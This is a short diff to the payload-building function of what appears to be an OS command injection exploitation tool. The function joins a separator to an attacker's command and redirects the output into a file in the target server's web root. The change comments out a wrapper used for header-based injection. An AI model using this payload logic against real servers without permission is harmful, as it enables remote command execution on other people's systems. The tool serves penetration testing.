@@ -83,11 +83,11 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
               "\")\"') do @set /p =%i " + ">" + OUTPUT_TEXTFILE + "< nul"
               ) 
   else:
-    if settings.USER_AGENT_INJECTION == True or \
-       settings.REFERER_INJECTION == True or \
-       settings.CUSTOM_HEADER_INJECTION == True:
-      if not settings.DEL in cmd:
-        cmd = "echo $(" + cmd + ")"
+    # if settings.USER_AGENT_INJECTION == True or \
+    #    settings.REFERER_INJECTION == True or \
+    #    settings.CUSTOM_HEADER_INJECTION == True:
+    #   if not settings.DEL in cmd:
+    #     cmd = "echo $(" + cmd + ")"
     payload = (separator +
               cmd + ">" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE
               )
